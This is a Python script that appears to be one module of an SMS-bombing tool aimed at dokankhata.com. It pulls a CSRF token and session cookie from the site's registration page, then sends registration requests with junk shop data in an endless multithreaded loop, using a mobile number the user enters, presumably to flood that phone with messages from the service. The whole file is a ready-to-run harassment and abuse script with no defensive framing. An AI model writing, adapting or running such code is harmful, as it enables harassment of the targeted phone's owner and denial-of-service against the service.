import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

# Function to send a single registration request
def send_registration_request(name, mobile, shopname, shopaddress, password):
    """
    Dokankhata API তে রেজিস্ট্রেশন রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    # Step 1: Extract CSRF token and session cookie from /register page
    url_get_register = "https://dokankhata.com/register"
    headers_get_register = {
        "Host": "dokankhata.com",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        response_get_register = requests.get(url_get_register, headers=headers_get_register)
        soup_register = BeautifulSoup(response_get_register.text, 'html.parser')

        # Extract CSRF token
        csrf_token = soup_register.find("meta", {"name": "csrf-token"})["content"]

        # Extract session cookie
        cookies_register = response_get_register.cookies.get_dict()
        dokankhata_session = cookies_register.get("dokankhata_session", "Not Found")

        if not csrf_token or dokankhata_session == "Not Found":
            print("Failed to extract CSRF token or session.")
            return

        # Step 2: Send POST request to register
        url_post_register = "https://dokankhata.com/register"
        headers_post_register = {
            "Host": "dokankhata.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://dokankhata.com",
            "Cookie": f"dokankhata_session={dokankhata_session}",
        }

        data_post_register = {
            "_token": csrf_token,
            "name": name,
            "mobile": mobile,
            "shopname": shopname,
            "shopaddress": shopaddress,
            "password": password,
            "confirmPassword": password,
            "termscheckbox": "true",
        }

        response_post_register = requests.post(url_post_register, headers=headers_post_register, data=data_post_register)

        # Main response displayed
        if response_post_register.status_code == 200:
            print(f"[Api_15] [{total_requests + 1}]  {response_post_register.text}")
            total_requests += 1
        else:
            print(f"Registration failed for {mobile}. Response code: {response_post_register.status_code}")

    except Exception as e:
        print(f"Error during registration: {e}")

# Function to send multiple requests
def send_requests_continuously(mobile, threads=1):
    """
    While loop দিয়ে নির্দিষ্ট সময় পর্যন্ত continuous রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid mobile number format. Please provide an 11-digit mobile number.")
        return

    # Continuously send registration requests in a loop
    while True:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Execute requests concurrently for the given number of threads
            futures = [executor.submit(send_registration_request, "hiiiiii", mobile, "Hiiiii stor", "Chittagong", "123456") for _ in range(threads)]
            for future in futures:
                # Wait for each request to finish
                future.result()

# Main function to start the continuous request sending system
def main(mobile, threads=1):
    """
    Main function to start sending requests continuously.
    """
    send_requests_continuously(mobile, threads)

if __name__ == "__main__":
    mobile = input("Enter an 11-digit mobile number: ")
    threads = int(input("Threads (1-50): "))
    main(mobile, threads)
